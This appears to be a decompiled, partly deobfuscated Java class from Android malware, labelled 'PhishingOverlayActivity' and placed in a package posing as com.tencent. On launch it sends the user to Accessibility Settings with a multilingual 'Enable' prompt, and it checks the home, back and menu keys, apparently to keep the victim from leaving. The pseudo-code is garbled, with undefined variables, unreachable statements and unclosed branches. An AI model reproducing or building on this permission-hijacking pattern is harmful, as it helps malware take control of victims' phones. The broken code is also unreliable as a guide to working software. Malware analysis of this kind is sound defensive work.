package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PhishingOverlayActivity
 * Original: Lcom/tencent/withdrawalhskfdisagreed3;
 */
public class PhishingOverlayActivity extends Activity {

    // === FIELDS ===
    static Context myctx;
    public String localeForAccessibility;

    // === METHODS ===

    static void StaticInitializer() {
        return;
    }

    public void Constructor() {
        // new Activity()
        v0 = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
        v1.localeForAccessibility = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
        return;
    }

    public void finish() {
        v0.finishAndRemoveTask();
        return;
    }

    public String localeTextAccessibility() {
        v0 = new JSONObject();
        v1 = v2.localeForAccessibility;
        // new JSONObject(v1)
        Locale.getDefault();
        v1.getLanguage();
        v0 = v0.getString(v1);
        return v0;
        v0 = "Enable";
        return "Enable";
    }

    public void onBackPressed() {
        v0.onBackPressed();
        return;
    }

    public void onCreate(Bundle param0) {
        v2.onCreate(v3);
        v0 = new Intent();
        v1 = "android.settings.ACCESSIBILITY_SETTINGS";
        // new Intent("android.settings.ACCESSIBILITY_SETTINGS")
        v2.startActivity(v0);
        v2.finish();
        return;
    }

    public void onDestroy() {
        v0.onDestroy();
        return;
    }

    public boolean onKeyDown(int param0, KeyEvent param1) {
        v3 = 3;
        v0 = 1;
        if (v2 != 3) { // goto +3
        // goto (branch)
        v3 = 4;
        if (v2 != 4) { // goto +3
        // goto (branch)
        v3 = 82;
        if (v2 != 82) { // goto +3
        // goto (branch)
        v0 = 0;
        return 0;
    }

    protected void onStop() {
        v0.onStop();
        return;
    }
}
